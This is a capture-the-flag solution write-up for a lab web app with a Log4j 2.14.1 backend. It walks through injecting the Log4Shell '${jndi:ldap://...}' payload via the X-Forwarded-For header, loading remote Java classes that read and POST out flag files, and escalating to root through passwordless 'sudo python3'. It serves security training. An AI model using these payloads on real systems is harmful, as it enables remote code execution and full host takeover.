## Solution

### Step 1 — Discover the vulnerable input

1. Check `robots.txt`:
   ```
   GET http://localhost:4021/robots.txt
   ```
   Notice `Disallow: /debug/log-preview`.

2. View the page source of any page — find the HTML comment:
   ```html
   <!-- EverSec Audit Logger v2.0 - Apache Log4j 2.14.1 backend -->
   ```
   Or check `/api/status` which explicitly states `"audit_backend": "Apache Log4j 2.14.1"`.

3. Visit `/debug/log-preview`. This shows recent Java audit log lines.

4. Send a probe request to confirm what gets logged:
   ```bash
   curl -H "X-Forwarded-For: probe-test-123" http://localhost:4021/
   ```
   Refresh `/debug/log-preview` — you'll see:
   ```
   09:14:22.401 INFO - Request from: probe-test-123
   ```
   The `X-Forwarded-For` header is logged verbatim. No sanitization.

---

### Step 2 — FLAG 1: Trigger JNDI callback (300 pts)

Log4j 2.14.1 evaluates `${...}` expressions inside log messages. The `${jndi:ldap://...}` lookup causes Log4j to make an outbound LDAP connection. There is an internal LDAP server running on `127.0.0.1:1389` — point the JNDI lookup at it to confirm the vulnerability.

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/detect}' http://localhost:4021/
```

Then immediately check the JNDI callback log:
```bash
curl http://localhost:4021/internal/callbacks
```

Or visit `http://localhost:4021/internal/callbacks` in a browser. You'll see:

```
[2026-04-08 14:23:07]  path: /detect
JNDI callback received! CVE-2021-44228 confirmed.

Flag 1: l0g4sh3ll_jnd1_c4llb4ck
```

> **Note:** The JNDI log auto-clears every 3 minutes. Check it promptly.

> **Alternative inputs:** `User-Agent` header and the `?q=` search query are also logged.

---

### Step 3 — FLAG 2: Remote class loading RCE (500 pts)

The `/detect` path only confirmed the JNDI callback (detection mode). A more dangerous path triggers **remote class loading**: Log4j fetches a Java `.class` file from the LDAP server's referenced HTTP server and executes it in the JVM. The JNDI log hint says: *"This server also supports class-loading paths for deeper diagnostics."*

Use the `/exploit` path:

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:4021/
```

The LDAP server responds with a reference to `FlagReader.class`. The Java audit logger's JVM loads and executes it. `FlagReader`'s static initializer:
- Reads `/app/flag2.txt`
- Runs `sudo -l` (reveals the privilege escalation path)
- HTTP POSTs both to the output collector

Check the RCE log within 3 minutes:
```bash
curl http://localhost:4021/internal/diagnostic-output
```

Output:
```
=== RCE via Log4Shell (CVE-2021-44228) ===

FLAG2: rc3_v14_cl4ss_l04d1ng

--- sudo -l ---
Matching Defaults entries for ctfuser on ...:
    ...

User ctfuser may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/python3

--- id ---
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

---

### Step 4 — FLAG 3: Privilege escalation via sudo python3 (700 pts)

The `sudo -l` output from FLAG 2 reveals that `ctfuser` can run `/usr/local/bin/python3` as root with no password. This is a classic GTFOBins vector.

Use the `/privesc` JNDI path to load `PrivEsc.class`, which executes the sudo privesc:

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/privesc}' http://localhost:4021/
```

`PrivEsc`'s static initializer runs:
```bash
sudo /usr/local/bin/python3 -c "print(open('/root/flag3.txt').read())"
```

Check the RCE log:
```bash
curl http://localhost:4021/internal/diagnostic-output
```

Output:
```
=== Privilege Escalation via sudo python3 ===

FLAG3: r00t3d_v14_l0g4sh3ll
```

---